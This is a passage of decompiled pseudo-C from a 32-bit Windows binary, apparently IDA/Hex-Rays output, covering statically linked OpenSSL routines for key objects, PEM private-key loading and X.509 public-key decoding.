  v1 = (int *)sub_435DD0(v17);
  v2 = 0;
  v20 = v1;
  v19 = 0;
  if ( sub_426A30((int)v1) <= 0 )
    return 1;
  while ( 1 )
  {
    v3 = (_DWORD *)sub_426A40(v1, v2);
    v4 = sub_431A70((int)v3, 771, &v18, 0);
    v5 = v4;
    if ( v4 )
      break;
    if ( v18 != -1 )
      goto LABEL_6;
LABEL_11:
    v3[6] = v19;
    v9 = (unsigned int *)sub_431A70((int)v3, 141, &v18, 0);
    v10 = v9;
    if ( v9 )
    {
      v3[7] = sub_4318F0(v9);
      sub_42C4F0(v10);
    }
    else
    {
      if ( v18 != -1 )
      {
LABEL_6:
        *(_DWORD *)(a1 + 72) |= 0x80u;
        return 1;
      }
      v3[7] = -1;
    }
    v11 = (int *)v3[5];
    v18 = 0;
    v12 = sub_426A30((int)v11);
    v13 = v18;
    if ( v18 < v12 )
    {
      while ( 1 )
      {
        v14 = sub_426A40(v11, v13);
        if ( sub_4319E0(v14) )
        {
          v15 = sub_445DB0(v14);
          if ( sub_423680(v15) != 771 )
            break;
        }
        ++v18;
        v16 = sub_426A30((int)v11);
        v13 = v18;
        if ( v18 >= v16 )
          goto LABEL_21;
      }
      *(_DWORD *)(a1 + 72) |= 0x200u;
    }
LABEL_21:
    if ( ++v2 >= sub_426A30((int)v20) )
      return 1;
    v1 = v20;
  }
  v7 = *(_DWORD *)(a1 + 100) == 0;
  v19 = v4;
  if ( !v7 || (v8 = sub_426AF0(), (*(_DWORD *)(a1 + 100) = v8) != 0) )
  {
    if ( sub_4269B0(*(int **)(a1 + 100), v5) )
      goto LABEL_11;
  }
  return 0;
}
// 41C2BE: variable 'v17' is possibly undefined

//----- (0041C430) --------------------------------------------------------
int __usercall sub_41C430@<eax>(int *a1@<esi>, int a2)
{
  int v2; // edx
  int v3; // ecx
  int *v4; // ecx
  void *v5; // eax

  *(_DWORD *)(a2 + 84) |= 1u;
  v2 = 0;
  if ( a1[1] > 0 )
  {
    v2 = 1;
    *(_DWORD *)(a2 + 84) |= 4u;
  }
  if ( a1[2] > 0 )
  {
    ++v2;
    *(_DWORD *)(a2 + 84) |= 8u;
  }
  if ( a1[5] > 0 )
  {
    ++v2;
    *(_DWORD *)(a2 + 84) |= 0x10u;
  }
  if ( v2 > 1 )
    *(_DWORD *)(a2 + 84) |= 2u;
  if ( a1[4] > 0 )
    *(_DWORD *)(a2 + 84) |= 0x20u;
  if ( a1[3] )
  {
    *(_DWORD *)(a2 + 84) |= 0x40u;
    v3 = a1[3];
    if ( *(int *)v3 > 0 )
      *(_DWORD *)(a2 + 88) = **(unsigned __int8 **)(v3 + 8);
    v4 = (int *)a1[3];
    if ( *v4 > 1 )
      *(_DWORD *)(a2 + 88) |= *(unsigned __int8 *)(v4[2] + 1) << 8;
    *(_DWORD *)(a2 + 88) &= 0x807Fu;
  }
  v5 = (void *)sub_407400(a2);
  return sub_432010(*a1, v5);
}

//----- (0041C4C0) --------------------------------------------------------
void *sub_41C4C0()
{
  return &unk_4F23C4;
}

//----- (0041C4D0) --------------------------------------------------------
int __cdecl sub_41C4D0(unsigned int **a1, _DWORD **a2)
{
  return sub_432AD0(*a1, *a2);
}

//----- (0041C4F0) --------------------------------------------------------
int __cdecl sub_41C4F0(int a1, unsigned int a2)
{
  return sub_432FA0((int)&unk_4F2354, (int *)(a1 + 44), a1 + 52, a1, a2);
}

//----- (0041C510) --------------------------------------------------------
BOOL __usercall sub_41C510@<eax>(_DWORD *a1@<ecx>, int a2@<edi>, int a3)
{
  _DWORD *v3; // ebx
  _DWORD *v5; // eax
  int v6; // esi
  int v7; // eax

  v3 = a1;
  if ( *(_DWORD *)(a2 + 24) )
  {
    if ( !a1 )
      v3 = (_DWORD *)sub_407400(a3);
    v6 = 0;
    if ( sub_426A30(*(_DWORD *)(a2 + 24)) <= 0 )
    {
      return 0;
    }
    else
    {
      while ( 1 )
      {
        v7 = sub_426A40(*(int **)(a2 + 24), v6);
        if ( *(_DWORD *)v7 == 4 && !sub_432EA0(v3, *(_DWORD **)(v7 + 4)) )
          break;
        if ( ++v6 >= sub_426A30(*(_DWORD *)(a2 + 24)) )
          return 0;
      }
      return 1;
    }
  }
  else if ( a1 )
  {
    v5 = (_DWORD *)sub_407400(a3);
    return sub_432EA0(v3, v5) == 0;
  }
  else
  {
    return 1;
  }
}

//----- (0041C5B0) --------------------------------------------------------
int __cdecl sub_41C5B0(int a1, unsigned int **a2, int *a3, _DWORD *a4)
{
  int v4; // ecx
  int v5; // edx
  int v6; // ebx
  unsigned int *v8; // edi
  int v9; // [esp-4h] [ebp-34h]
  int v10[9]; // [esp+Ch] [ebp-24h] BYREF

  v4 = a3[1];
  v5 = a3[2];
  v10[0] = *a3;
  v10[3] = a3[3];
  v9 = *(_DWORD *)(a1 + 24);
  v10[1] = v4;
  v10[2] = v5;
  if ( !sub_426AD0(v9) )
  {
    sub_414690(*(LPCRITICAL_SECTION *)(a1 + 132));
    sub_426A90(*(_DWORD *)(a1 + 24));
    sub_4146B0(*(LPCRITICAL_SECTION *)(a1 + 132));
  }
  v6 = sub_426BE0(*(_DWORD *)(a1 + 24), (int)v10);
  if ( v6 < 0 )
    return 0;
  for ( ; v6 < sub_426A30(*(_DWORD *)(a1 + 24)); ++v6 )
  {
    v8 = (unsigned int *)sub_426A40(*(int **)(a1 + 24), v6);
    if ( sub_430F50(v8, a3) )
      break;
    if ( sub_41C510(a4, (int)v8, a1) )
    {
      if ( a2 )
        *a2 = v8;
      return (v8[7] == 8) + 1;
    }
  }
  return 0;
}

//----- (0041C6B0) --------------------------------------------------------
int __cdecl sub_41C6B0(int a1, int a2)
{
  int v2; // eax

  if ( *(_DWORD *)a2 )
  {
    v2 = *(_DWORD *)(*(_DWORD *)a2 + 24);
    if ( v2 )
    {
      if ( a1 == 5 )
        sub_426840(v2, (int)sub_41C4D0);
    }
  }
  return 1;
}

//----- (0041C6E0) --------------------------------------------------------
int __cdecl sub_41C6E0(int a1, int *a2)
{
  int v2; // ebx
  int *v3; // eax
  int *v4; // eax
  int v5; // eax
  int *v6; // esi
  int v7; // edi
  int v8; // ebp
  int v9; // eax
  int v10; // esi
  int (__cdecl *v11)(int); // eax
  int (__cdecl *v13)(int); // eax
  void *v14; // ecx
  int v15; // [esp+Ch] [ebp+8h]

  v2 = *a2;
  if ( a1 == 1 )
  {
    v14 = off_531310;
    *(_DWORD *)(v2 + 80) = 0;
    *(_DWORD *)(v2 + 76) = 0;
    *(_DWORD *)(v2 + 72) = 0;
    *(_DWORD *)(v2 + 84) = 0;
    *(_DWORD *)(v2 + 88) = 32895;
    *(_DWORD *)(v2 + 124) = v14;
    *(_DWORD *)(v2 + 128) = 0;
    *(_DWORD *)(v2 + 100) = 0;
    *(_DWORD *)(v2 + 92) = 0;
    *(_DWORD *)(v2 + 96) = 0;
    return 1;
  }
  if ( a1 != 3 )
  {
    if ( a1 == 5 )
    {
      v3 = (int *)sub_42BEA0();
      sub_4333A0(v2, v3, v2 + 104, 0);
      v4 = (int *)sub_431A20(v2, 770, 0, 0);
      *(_DWORD *)(v2 + 80) = v4;
      if ( v4 )
        sub_41C430(v4, v2);
      *(_DWORD *)(v2 + 76) = sub_431A20(v2, 90, 0, 0);
      *(_DWORD *)(v2 + 92) = sub_431A20(v2, 88, 0, 0);
      v5 = sub_431A20(v2, 140, 0, 0);
      *(_DWORD *)(v2 + 96) = v5;
      if ( v5 && !*(_DWORD *)(v2 + 92) )
        *(_DWORD *)(v2 + 72) |= 0x80u;
      v6 = *(int **)(v2 + 28);
      v15 = (int)v6;
      v7 = 0;
      if ( sub_426A30((int)v6) > 0 )
      {
        while ( 1 )
        {
          v8 = sub_426A40(v6, v7);
          v9 = sub_445DB0(v8);
          v10 = sub_423680(v9);
          if ( v10 == 857 )
            *(_DWORD *)(v2 + 72) |= 0x1000u;
          if ( sub_4319E0(v8) )
            break;
          if ( ++v7 >= sub_426A30(v15) )
            goto LABEL_21;
          v6 = (int *)v15;
        }
        if ( v10 != 770 && v10 != 90 && v10 != 140 )
          *(_DWORD *)(v2 + 72) |= 0x200u;
      }
LABEL_21:
      if ( !sub_41C2B0(v2) )
        return 0;
      v11 = *(int (__cdecl **)(int))(*(_DWORD *)(v2 + 124) + 4);
      if ( v11 )
      {
        if ( !v11(v2) )
          return 0;
      }
    }
    return 1;
  }
  v13 = *(int (__cdecl **)(int))(*(_DWORD *)(v2 + 124) + 8);
  if ( v13 && !v13(*a2) )
    return 0;
  sub_433350(*(_DWORD *)(v2 + 76));
  sub_431D80(*(_DWORD *)(v2 + 80));
  sub_42C4F0(*(void **)(v2 + 92));
  sub_42C4F0(*(void **)(v2 + 96));
  sub_426C00(*(void **)(v2 + 100), sub_433310);
  return 1;
}
// 531310: using guessed type void *off_531310;

//----- (0041C8C0) --------------------------------------------------------
void *sub_41C8C0()
{
  return &unk_4F2614;
}

//----- (0041C8D0) --------------------------------------------------------
int __cdecl sub_41C8D0(int a1, int *a2, int a3, int a4)
{
  void *v4; // eax
  int result; // eax

  switch ( a1 )
  {
    case 10:
      if ( sub_434600((_DWORD *)(a4 + 8), *a2) <= 0 )
        goto LABEL_4;
      goto LABEL_3;
    case 11:
    case 13:
      if ( sub_434040((_DWORD *)*a2, *(int ***)(a4 + 4)) > 0 )
        goto LABEL_6;
      goto LABEL_4;
    case 12:
LABEL_3:
      v4 = sub_433780((_DWORD *)*a2, *(void **)a4);
      *(_DWORD *)(a4 + 4) = v4;
      if ( v4 )
        goto LABEL_6;
LABEL_4:
      result = 0;
      break;
    default:
LABEL_6:
      result = 1;
      break;
  }
  return result;
}

//----- (0041C950) --------------------------------------------------------
void *sub_41C950()
{
  return &unk_4F2700;
}

//----- (0041C960) --------------------------------------------------------
void *sub_41C960()
{
  return &unk_4F271C;
}

//----- (0041C970) --------------------------------------------------------
int __cdecl sub_41C970(int a1, int a2)
{
  if ( a1 == 3 )
    sub_41CEB0(*(volatile LONG **)(*(_DWORD *)a2 + 28));
  return 1;
}

//----- (0041C990) --------------------------------------------------------
void *sub_41C990()
{
  return &unk_4F2854;
}

//----- (0041C9A0) --------------------------------------------------------
void *sub_41C9A0()
{
  return &unk_4F2898;
}

//----- (0041C9B0) --------------------------------------------------------
void *sub_41C9B0()
{
  return &unk_4F28F0;
}

//----- (0041C9C0) --------------------------------------------------------
int __cdecl sub_41C9C0(int a1, int a2)
{
  if ( a1 == 3 )
    sub_433520(*(_DWORD *)(*(_DWORD *)a2 + 16));
  return 1;
}

//----- (0041C9E0) --------------------------------------------------------
void *sub_41C9E0()
{
  return &unk_4F2924;
}

//----- (0041C9F0) --------------------------------------------------------
void *sub_41C9F0()
{
  return &unk_4F29CC;
}

//----- (0041CA00) --------------------------------------------------------
void *sub_41CA00()
{
  return &unk_4F2A74;
}

//----- (0041CA10) --------------------------------------------------------
void *sub_41CA10()
{
  return &unk_4F2AB8;
}

//----- (0041CA20) --------------------------------------------------------
void *sub_41CA20()
{
  return &unk_4F2AD4;
}

//----- (0041CA30) --------------------------------------------------------
void *sub_41CA30()
{
  return &unk_4F2B54;
}

//----- (0041CA40) --------------------------------------------------------
int __cdecl sub_41CA40(int a1, char ****a2)
{
  char ***v2; // esi

  if ( a1 == 1 )
  {
    v2 = *a2;
    *v2 = sub_423310(0x4Fu);
  }
  return 1;
}

//----- (0041CA70) --------------------------------------------------------
int __cdecl sub_41CA70(int a1)
{
  int v1; // eax
  int (*v2)(void); // eax

  if ( a1 && (v1 = *(_DWORD *)(a1 + 12)) != 0 && (v2 = *(int (**)(void))(v1 + 52)) != 0 )
    return v2();
  else
    return 0;
}

//----- (0041CA90) --------------------------------------------------------
int __cdecl sub_41CA90(int a1)
{
  int v1; // eax
  int (*v2)(void); // eax

  if ( a1 && (v1 = *(_DWORD *)(a1 + 12)) != 0 && (v2 = *(int (**)(void))(v1 + 48)) != 0 )
    return v2();
  else
    return 0;
}

//----- (0041CAB0) --------------------------------------------------------
int __cdecl sub_41CAB0(int a1)
{
  int v1; // eax
  int (*v2)(void); // eax

  v1 = *(_DWORD *)(a1 + 12);
  if ( v1 && (v2 = *(int (**)(void))(v1 + 68)) != 0 )
    return v2();
  else
    return 0;
}

//----- (0041CAD0) --------------------------------------------------------
int __cdecl sub_41CAD0(_DWORD *a1, _DWORD *a2)
{
  int v3; // eax
  int (*v4)(void); // eax

  if ( *a1 != *a2 )
    return -1;
  v3 = a1[3];
  if ( v3 && (v4 = *(int (**)(void))(v3 + 76)) != 0 )
    return v4();
  else
    return -2;
}

//----- (0041CB00) --------------------------------------------------------
_DWORD *sub_41CB00()
{
  _DWORD *v0; // esi
  struct _RTL_CRITICAL_SECTION *v2; // eax

  v0 = sub_413430(0x24u);
  if ( v0 )
  {
    *v0 = 0;
    v0[1] = 0;
    v0[2] = 1;
    v0[6] = 1;
    v2 = sub_414650();
    v0[8] = v2;
    if ( v2 )
    {
      return v0;
    }
    else
    {
      sub_408310(6, 106, 65, (int)"crypto\\evp\\p_lib.c", 152);
      sub_413490(v0);
      return 0;
    }
  }
  else
  {
    sub_408310(6, 106, 65, (int)"crypto\\evp\\p_lib.c", 143);
    return 0;
  }
}

//----- (0041CB90) --------------------------------------------------------
BOOL __cdecl sub_41CB90(int a1)
{
  return sub_4147E0((volatile LONG *)(a1 + 8), 1, &a1) > 0 && a1 > 1;
}

//----- (0041CBC0) --------------------------------------------------------
int __cdecl sub_41CBC0(_DWORD *a1)
{
  if ( *a1 == 408 )
    return a1[5];
  sub_408310(6, 131, 142, (int)"crypto\\evp\\p_lib.c", 319);
  return 0;
}

//----- (0041CC00) --------------------------------------------------------
int __cdecl sub_41CC00(void *a1)
{
  int *v1; // eax
  int v2; // esi
  volatile LONG *v4; // [esp+4h] [ebp-4h] BYREF

  v1 = (int *)sub_430AB0(&v4, a1);
  if ( v1 )
  {
    v2 = *v1;
    sub_4162A0(v4);
    return v2;
  }
  else
  {
    sub_4162A0(v4);
    return 0;
  }
}

//----- (0041CC50) --------------------------------------------------------
void __usercall sub_41CC50(int a1@<esi>)
{
  int v1; // eax
  void (__cdecl *v2)(int); // eax
  struct _RTL_CRITICAL_SECTION *v3; // [esp-8h] [ebp-8h]

  v1 = *(_DWORD *)(a1 + 12);
  if ( v1 )
  {
    v2 = *(void (__cdecl **)(int))(v1 + 88);
    if ( v2 )
    {
      v2(a1);
      *(_DWORD *)(a1 + 20) = 0;
    }
  }
  sub_4162A0(*(volatile LONG **)(a1 + 16));
  v3 = *(struct _RTL_CRITICAL_SECTION **)(a1 + 32);
  *(_DWORD *)(a1 + 16) = 0;
  sub_4146D0(v3);
}

//----- (0041CC90) --------------------------------------------------------
int __cdecl sub_41CC90(int a1, unsigned int *a2, int a3, int a4)
{
  unsigned int v4; // eax
  int (__cdecl *v5)(int, unsigned int *, int, int); // eax
  char *v7; // eax

  v4 = a2[3];
  if ( v4 )
  {
    v5 = *(int (__cdecl **)(int, unsigned int *, int, int))(v4 + 32);
    if ( v5 )
      return v5(a1, a2, a3, a4);
  }
  sub_405340(a1, a3, 128);
  v7 = sub_423440(*a2);
  sub_419190(a1, "%s algorithm \"%s\" unsupported\n", "Public Key", v7);
  return 1;
}

//----- (0041CD00) --------------------------------------------------------
int __cdecl sub_41CD00(int a1, int a2)
{
  int v2; // eax
  int (__cdecl *v3)(int, int, _DWORD, int); // eax

  v2 = *(_DWORD *)(a1 + 12);
  if ( v2 && (v3 = *(int (__cdecl **)(int, int, _DWORD, int))(v2 + 92)) != 0 )
    return v3(a1, 3, 0, a2);
  else
    return -2;
}

//----- (0041CD30) --------------------------------------------------------
int __fastcall sub_41CD30(char *a1, int a2, void *a3, volatile LONG *MaxCount)
{
  int v6; // eax
  _DWORD *v7; // edi
  int v9; // edx
  int v10; // [esp+Ch] [ebp-4h] BYREF

  v10 = 0;
  if ( a2 )
  {
    if ( *(_DWORD *)(a2 + 20) )
      sub_41CC50(a2);
    if ( a3 == *(void **)(a2 + 4) && *(_DWORD *)(a2 + 12) )
      return 1;
    sub_4162A0(*(volatile LONG **)(a2 + 16));
    *(_DWORD *)(a2 + 16) = 0;
  }
  if ( a1 )
    v6 = sub_430B10((volatile LONG **)&v10, a1, MaxCount);
  else
    v6 = sub_430AB0(&v10, a3);
  v7 = (_DWORD *)v6;
  if ( !a2 )
    sub_4162A0((volatile LONG *)v10);
  if ( !v7 )
  {
    sub_408310(6, 158, 156, (int)"crypto\\evp\\p_lib.c", 204);
    return 0;
  }
  if ( a2 )
  {
    v9 = v10;
    *(_DWORD *)(a2 + 12) = v7;
    *(_DWORD *)(a2 + 16) = v9;
    *(_DWORD *)a2 = *v7;
    *(_DWORD *)(a2 + 4) = a3;
  }
  return 1;
}

//----- (0041CE00) --------------------------------------------------------
int __cdecl sub_41CE00(int a1, void *a2)
{
  return sub_41CD30(0, a1, a2, (volatile LONG *)0xFFFFFFFF);
}

//----- (0041CE20) --------------------------------------------------------
BOOL __cdecl sub_41CE20(int a1, void *a2, int a3)
{
  if ( !a1 || !sub_41CD30(0, a1, a2, (volatile LONG *)0xFFFFFFFF) )
    return 0;
  *(_DWORD *)(a1 + 20) = a3;
  return a3 != 0;
}

//----- (0041CE60) --------------------------------------------------------
BOOL __cdecl sub_41CE60(int a1, int a2)
{
  if ( !a1 || !sub_41CD30(0, a1, (void *)0x198, (volatile LONG *)0xFFFFFFFF) )
    return 0;
  *(_DWORD *)(a1 + 20) = a2;
  if ( a2 )
    sub_41E120(a2);
  return a2 != 0;
}

//----- (0041CEB0) --------------------------------------------------------
void __cdecl sub_41CEB0(volatile LONG *Block)
{
  void **v1; // esi

  v1 = (void **)Block;
  if ( Block )
  {
    sub_4147E0(Block + 2, -1, &Block);
    if ( (int)Block <= 0 )
    {
      sub_41CC50((int)v1);
      sub_426C00(v1[7], sub_42C870);
      sub_413490(v1);
    }
  }
}

//----- (0041CF00) --------------------------------------------------------
int __cdecl sub_41CF00(_DWORD *a1, int a2)
{
  int v2; // eax
  int (__cdecl *v3)(int); // eax
  int result; // eax
  int v5; // eax
  int (__cdecl *v6)(_DWORD *); // eax
  int v7; // eax
  int (__cdecl *v8)(_DWORD *, int); // eax

  if ( *a1 )
  {
    if ( *a1 != *(_DWORD *)a2 )
    {
      sub_408310(6, 103, 101, (int)"crypto\\evp\\p_lib.c", 79);
      return 0;
    }
  }
  else if ( !sub_41CD30(0, (int)a1, *(void **)a2, (volatile LONG *)0xFFFFFFFF) )
  {
    return 0;
  }
  v2 = *(_DWORD *)(a2 + 12);
  if ( v2 )
  {
    v3 = *(int (__cdecl **)(int))(v2 + 68);
    if ( v3 )
    {
      if ( v3(a2) )
      {
        sub_408310(6, 103, 103, (int)"crypto\\evp\\p_lib.c", 84);
        return 0;
      }
    }
  }
  v5 = a1[3];
  if ( v5 && (v6 = *(int (__cdecl **)(_DWORD *))(v5 + 68)) != 0 && v6(a1) )
  {
    v7 = *(_DWORD *)(a2 + 12);
    if ( !v7 )
      return 0;
    v8 = *(int (__cdecl **)(_DWORD *, int))(v7 + 72);
    if ( !v8 )
      return 0;
    return v8(a1, a2);
  }
  else
  {
    result = sub_41CAD0(a1, (_DWORD *)a2);
    if ( result != 1 )
    {
      sub_408310(6, 103, 153, (int)"crypto\\evp\\p_lib.c", 91);
      return 0;
    }
  }
  return result;
}

//----- (0041CFE0) --------------------------------------------------------
volatile LONG *__cdecl sub_41CFE0(
        _DWORD *a1,
        volatile LONG **a2,
        int (__cdecl *a3)(char *, int, _DWORD, void *),
        void *Src)
{
  volatile LONG *result; // eax
  int v5; // esi
  _DWORD *v6; // edi
  int v7; // eax
  int v8; // eax
  volatile LONG **v9; // edi
  volatile LONG *v10; // ebp
  volatile LONG *v11; // eax
  int v12; // eax
  volatile LONG *v13; // [esp+Ch] [ebp-41Ch]
  int v14; // [esp+10h] [ebp-418h] BYREF
  void *Block; // [esp+14h] [ebp-414h] BYREF
  void *v16; // [esp+18h] [ebp-410h] BYREF
  volatile LONG **v17; // [esp+1Ch] [ebp-40Ch]
  void *v18; // [esp+20h] [ebp-408h] BYREF
  char v19[1024]; // [esp+24h] [ebp-404h] BYREF

  v17 = a2;
  Block = 0;
  v16 = 0;
  v18 = 0;
  v13 = 0;
  result = (volatile LONG *)sub_41C0B0(&v18, (int)&v14, &Block, "ANY PRIVATE KEY", a1, (int)a3, Src);
  if ( result )
  {
    v16 = v18;
    if ( !strcmp((const char *)Block, "PRIVATE KEY") )
    {
      v5 = sub_434B20(0, &v16, v14);
    }
    else
    {
      if ( strcmp((const char *)Block, "ENCRYPTED PRIVATE KEY") )
      {
        v11 = (volatile LONG *)sub_41B4C0((const char *)Block, "PRIVATE KEY");
        if ( (int)v11 <= 0 )
          goto LABEL_21;
        v12 = sub_430B10(0, (char *)Block, v11);
        if ( !v12 || !*(_DWORD *)(v12 + 96) )
          goto LABEL_21;
        v13 = sub_4349B0(*(void **)v12, v17, &v16, v14);
LABEL_20:
        if ( !v13 )
          goto LABEL_21;
LABEL_22:
        sub_413490(Block);
        sub_4134B0(v18, v14);
        return v13;
      }
      v6 = (_DWORD *)sub_434DC0(0, &v16, v14);
      if ( !v6 )
      {
LABEL_21:
        sub_408310(9, 123, 13, (int)"crypto\\pem\\pem_pkey.c", 86);
        goto LABEL_22;
      }
      if ( a3 )
        v7 = a3(v19, 1024, 0, Src);
      else
        v7 = sub_41A830(v19, 1024, 0, (const char *)Src);
      if ( v7 <= 0 )
      {
        sub_408310(9, 123, 104, (int)"crypto\\pem\\pem_pkey.c", 63);
        sub_434E00((int)v6);
        goto LABEL_22;
      }
      v5 = sub_434D60(v6, v19, v7);
      sub_434E00((int)v6);
    }
    if ( v5 )
    {
      v8 = sub_434C20(v5);
      v9 = v17;
      v10 = (volatile LONG *)v8;
      v13 = (volatile LONG *)v8;
      if ( v17 )
      {
        sub_41CEB0(*v17);
        *v9 = v10;
      }
      sub_434B40(v5);
      goto LABEL_20;
    }
    goto LABEL_21;
  }
  return result;
}

//----- (0041D260) --------------------------------------------------------
int __cdecl sub_41D260(int a1, volatile LONG **a2)
{
  int v2; // eax

  if ( a1 )
  {
    if ( a1 == 2 )
    {
      sub_405630(*a2);
      *a2 = 0;
      return 2;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    v2 = sub_405910();
    *a2 = (volatile LONG *)v2;
    return v2 != 0 ? 2 : 0;
  }
}

//----- (0041D2B0) --------------------------------------------------------
void *sub_41D2B0()
{
  return &unk_4F2E6C;
}

//----- (0041D2C0) --------------------------------------------------------
int sub_41D2C0()
{
  return sub_42FB20((int)&unk_4F2E6C);
}

//----- (0041D2D0) --------------------------------------------------------
void __cdecl sub_41D2D0(int a1)
{
  sub_42FEF0(a1, (int)&unk_4F2E6C);
}

//----- (0041D2F0) --------------------------------------------------------
void *sub_41D2F0()
{
  return &unk_4F2F14;
}

//----- (0041D300) --------------------------------------------------------
int sub_41D300()
{
  return sub_42FB20((int)&unk_4F2F14);
}

//----- (0041D310) --------------------------------------------------------
void __cdecl sub_41D310(int a1)
{
  sub_42FEF0(a1, (int)&unk_4F2F14);
}

//----- (0041D330) --------------------------------------------------------
int __cdecl sub_41D330(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_4F2DF4);
}

//----- (0041D350) --------------------------------------------------------
signed int __cdecl sub_41D350(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_4F2DF4);
}

//----- (0041D370) --------------------------------------------------------
int __cdecl sub_41D370(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_4F2E50);
}

//----- (0041D390) --------------------------------------------------------
signed int __cdecl sub_41D390(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_4F2E50);
}

//----- (0041D3B0) --------------------------------------------------------
void *sub_41D3B0()
{
  return &unk_4F2F90;
}

//----- (0041D3C0) --------------------------------------------------------
int __usercall sub_41D3C0@<eax>(int **a1@<edi>, volatile LONG **a2)
{
  volatile LONG *v2; // esi
  void *v4; // eax
  int (__cdecl *v5)(volatile LONG *, int **); // eax

  v2 = sub_41CB00();
  if ( !v2 )
  {
    sub_408310(11, 148, 65, (int)"crypto\\x509\\x_pubkey.c", 108);
    return -1;
  }
  v4 = (void *)sub_423680(**a1);
  if ( sub_41CE00((int)v2, v4) )
  {
    v5 = *(int (__cdecl **)(volatile LONG *, int **))(*((_DWORD *)v2 + 3) + 20);
    if ( v5 )
    {
      if ( v5(v2, a1) )
      {
        *a2 = v2;
        return 1;
      }
      sub_408310(11, 148, 125, (int)"crypto\\x509\\x_pubkey.c", 124);
    }
    else
    {
      sub_408310(11, 148, 124, (int)"crypto\\x509\\x_pubkey.c", 128);
    }
  }
  else
  {
    sub_408310(11, 148, 111, (int)"crypto\\x509\\x_pubkey.c", 113);
  }
  sub_41CEB0(v2);
  return 0;
}

//----- (0041D4E0) --------------------------------------------------------
int __cdecl sub_41D4E0(int *a1, int a2, int a3, int a4, int a5, int a6)
{
  int result; // eax

  result = sub_42C750(*a1, a2, a3, a4);
  if ( result )
  {
    if ( a5 )
    {
      sub_413490(*(void **)(a1[1] + 8));
      *(_DWORD *)(a1[1] + 8) = a5;
      *(_DWORD *)a1[1] = a6;
      *(_DWORD *)(a1[1] + 12) &= 0xFFFFFFF0;
      *(_DWORD *)(a1[1] + 12) |= 8u;
    }
    return 1;
  }
  return result;
}

//----- (0041D550) --------------------------------------------------------
int __cdecl sub_41D550(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5)
{
  if ( a1 )
    *a1 = **(_DWORD **)a5;
  if ( a2 )
  {
    *a2 = *(_DWORD *)(*(_DWORD *)(a5 + 4) + 8);
    *a3 = **(_DWORD **)(a5 + 4);
  }
  if ( a4 )
    *a4 = *(_DWORD *)a5;
  return 1;
}

//----- (0041D590) --------------------------------------------------------
int __cdecl sub_41D590(int a1, int ***a2)
{
  int **v3; // edi
  volatile LONG **v4; // esi

  if ( a1 == 3 )
  {
    sub_41CEB0((*a2)[2]);
    return 1;
  }
  if ( a1 == 5 )
  {
    v3 = *a2;
    v4 = (volatile LONG **)(*a2 + 2);
    sub_41CEB0(*v4);
    sub_4081F0();
    if ( sub_41D3C0(v3, v4) == -1 )
      return 0;
    sub_408220();
  }
  return 1;
}

//----- (0041D5F0) --------------------------------------------------------
char **sub_41D5F0()
{
  char **result; // eax

  result = (char **)stru_538F78.LockCount;
  if ( !stru_538F78.LockCount )
  {
    result = sub_4351C0();
    stru_538F78.LockCount = (LONG)result;
  }
  return result;
}

//----- (0041D610) --------------------------------------------------------
void __cdecl sub_41D610(volatile LONG *Block)
{
  volatile LONG *v1; // esi
  void (__cdecl *v2)(volatile LONG *); // eax

  v1 = Block;
  if ( Block )
  {
    sub_4147E0(Block + 9, -1, &Block);
    if ( (int)Block <= 0 )
    {
      v2 = *(void (__cdecl **)(volatile LONG *))(*((_DWORD *)v1 + 11) + 28);
      if ( v2 )
        v2(v1);
      sub_4162A0(*((volatile LONG **)v1 + 12));
      sub_414DC0(7u, (int)v1, (int **)v1 + 10);
      sub_4146D0(*((LPCRITICAL_SECTION *)v1 + 13));
      sub_417000(*((_DWORD **)v1 + 2));
      sub_417000(*((_DWORD **)v1 + 3));
      sub_417000(*((_DWORD **)v1 + 4));
      sub_417000(*((_DWORD **)v1 + 5));
      sub_417000(*((_DWORD **)v1 + 6));
      sub_413490((void *)v1);
    }
  }
}

//----- (0041D710) --------------------------------------------------------
int __cdecl sub_41D710(int a1, int a2, int a3)
{
  return sub_414870((int *)(a1 + 40), a2, a3);
}

//----- (0041D720) --------------------------------------------------------
int __cdecl sub_41D720(int a1, int a2)
{
  _DWORD *v3; // [esp+4h] [ebp+4h]

  v3 = (_DWORD *)(a1 + 40);
  if ( *v3 && a2 < sub_426A30(*v3) )
    return sub_426A40(*v3, a2);
  else
    return 0;
}
// 426A30: using guessed type _DWORD __cdecl sub_426A30(_DWORD);
// 426A40: using guessed type _DWORD __cdecl sub_426A40(_DWORD, _DWORD);

//----- (0041D770) --------------------------------------------------------
volatile LONG *__cdecl sub_41D770(int *a1)
{
  void **v1; // edi
  void **v2; // ebx
  void **v3; // ebp
  void **v4; // eax
  int v5; // esi
  volatile LONG *v7; // [esp+10h] [ebp-Ch]
  void **Block; // [esp+14h] [ebp-8h]
  void **v9; // [esp+18h] [ebp-4h]

  v1 = 0;
  v2 = 0;
  v3 = 0;
  v7 = 0;
  Block = 0;
  v9 = 0;
  if ( !a1 )
    goto LABEL_19;
  v7 = (volatile LONG *)sub_4349A0();
  if ( !v7 )
    goto LABEL_19;
  if ( a1[2] )
  {
    if ( !a1[4] )
      goto LABEL_19;
    if ( !a1[3] )
      goto LABEL_19;
    v1 = sub_4176D0(a1[2]);
    v3 = sub_4176D0(a1[4]);
    v4 = sub_4176D0(a1[3]);
    v2 = v4;
    if ( !v1 || !v3 || !v4 || !sub_4347F0((int)v7, (int)v1, v4, (int)v3) )
      goto LABEL_19;
    v2 = 0;
    v3 = 0;
    v1 = 0;
  }
  else if ( a1[4] || a1[3] )
  {
    goto LABEL_19;
  }
  if ( a1[5] )
  {
    Block = sub_4176D0(a1[5]);
    if ( !Block )
      goto LABEL_19;
    v5 = a1[6];
    if ( v5 )
    {
      v9 = sub_4176D0(v5);
      if ( !v9 )
        goto LABEL_19;
    }
    if ( !sub_41D940((int)v7, (int)Block, (int)v9) )
      goto LABEL_19;
  }
  else if ( a1[6] )
  {
LABEL_19:
    sub_417060(v1);
    sub_417060(v3);
    sub_417060(v2);
    sub_417060(Block);
    sub_417060(v9);
    sub_4346C0(v7);
    return 0;
  }
  return v7;
}
// 41D7C0: conditional instruction was optimized away because eax.4==0

//----- (0041D8C0) --------------------------------------------------------
